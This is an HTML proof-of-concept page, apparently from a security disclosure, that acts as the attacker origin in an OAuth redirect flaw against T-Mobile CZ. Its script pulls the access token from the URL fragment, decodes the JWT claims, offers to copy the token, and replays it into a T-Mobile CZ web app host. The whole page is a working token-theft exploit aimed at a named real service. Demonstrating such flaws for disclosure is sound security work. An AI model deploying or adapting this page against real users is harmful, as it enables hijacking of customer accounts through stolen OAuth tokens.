<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>T-Mobile CZ PoC</title>
<style>
  body{font:15px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;margin:2rem;max-width:1100px}
  h1{font:700 22px/1.3 system-ui,sans-serif}
  .ok{color:#0a7a2f;font-weight:700}
  pre{white-space:pre-wrap;word-break:break-all;background:#111;color:#7CFC9A;padding:1rem;border-radius:8px}
  button{font:600 14px system-ui,sans-serif;padding:.6rem 1rem;margin:.3rem .4rem .3rem 0;border:0;border-radius:6px;background:#111;color:#fff;cursor:pointer}
  button.alt{background:#0a7a2f}
  small{color:#555}
</style>
</head>
<body>
<h1>OAuth token received on attacker origin</h1>
<p class="ok" id="where"></p>
<p><small>This page is <b>theredtea.space</b>. The token below was issued by the real T-Mobile CZ identity server.</small></p>
<p>
  <button onclick="copyToken()">Copy token</button>
  <button class="alt" onclick="useInApp()">Use token in T-Mobile CZ app</button>
  <button onclick="showRaw()">Show raw fragment</button>
</p>
<h3>Decoded JWT claims</h3>
<pre id="claims">(no token in fragment)</pre>
<h3>Raw fragment</h3>
<pre id="raw" style="display:none"></pre>
<script>
const hash = location.hash || "";
document.getElementById("where").textContent = "Origin: " + location.origin + location.pathname + "  |  fragment length: " + hash.length;
const m = hash.match(/access_token=([^&]+)/);
let TOKEN = m ? m[1] : "";
if (TOKEN) {
  const p = TOKEN.split(".")[1].replace(/-/g,"+").replace(/_/g,"/");
  try {
    const claims = JSON.parse(atob(p.padEnd(Math.ceil(p.length/4)*4,"=")));
    document.getElementById("claims").textContent = JSON.stringify(claims, null, 2);
  } catch(e) {
    document.getElementById("claims").textContent = "decode error: " + e;
  }
}
function showRaw(){ const el=document.getElementById("raw"); el.textContent=hash; el.style.display="block"; }
function copyToken(){ if(TOKEN) navigator.clipboard.writeText(TOKEN); alert("Token copied (" + TOKEN.length + " chars)"); }
function useInApp(){ if(TOKEN) location.href = "https://tmobile-cz-web.moj.io/#access_token=" + TOKEN; else alert("No access_token in fragment"); }
</script>
</body>
</html>
